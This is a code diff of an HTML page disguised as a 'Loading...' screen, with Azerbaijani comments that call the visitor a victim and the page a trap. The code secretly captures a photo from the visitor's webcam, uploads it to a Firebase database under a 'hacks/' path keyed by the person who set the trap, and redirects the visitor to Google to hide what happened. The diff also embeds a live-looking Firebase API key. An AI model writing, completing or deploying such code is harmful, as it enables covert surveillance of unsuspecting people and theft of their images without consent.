@@ -1,28 +1,61 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }</style>
+</head>
 <body>
-<video id="v" autoplay style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-<script>
-    const firebaseConfig = { apiKey: "...", databaseURL: "..." }; // İndex-dəki ilə eyni
-    firebase.initializeApp(firebaseConfig);
-    const urlParams = new URLSearchParams(window.location.search);
-    const ref = urlParams.get('ref');
+    <video id="video" autoplay playsinline style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-    navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-        const v = document.getElementById('v'); v.srcObject = s;
-        setTimeout(() => {
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const img = c.toDataURL('image/jpeg');
-            firebase.database().ref('hacks/' + ref).push({ image: img, date: new Date().toLocaleString() });
-            window.location.href = "https://google.com"; // Şəkil getdikdən sonra qurbanı Google-a at
-        }, 2000);
-    });
-</script>
+    <script>
+        // İNDEX.HTML İLƏ EYNİ OLMALIDIR
+        const firebaseConfig = { 
+            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", 
+            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com", 
+            projectId: "sevgili-testi" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // URL-dən kimin tələsi olduğunu tapırıq (?ref=username)
+        const urlParams = new URLSearchParams(window.location.search);
+        const owner = urlParams.get('ref');
+
+        if (owner) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Kamera açıldıqdan 2 saniyə sonra şəkli çək
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    // Şəkli Firebase-ə göndər (hacks/istifadəçi_adı qovluğuna)
+                    database.ref('hacks/' + owner).push({
+                        image: imageData,
+                        date: new Date().toLocaleString()
+                    }).then(() => {
+                        // İş bitdikdən sonra qurbanı Google-a yönləndir
+                        window.location.href = "https://www.google.com";
+                    });
+                }, 2000);
+            })
+            .catch(function(err) {
+                // Kamera icazəsi verilməzsə də Google-a at
+                window.location.href = "https://www.google.com";
+            });
+        }
+    </script>
 </body>
 </html>
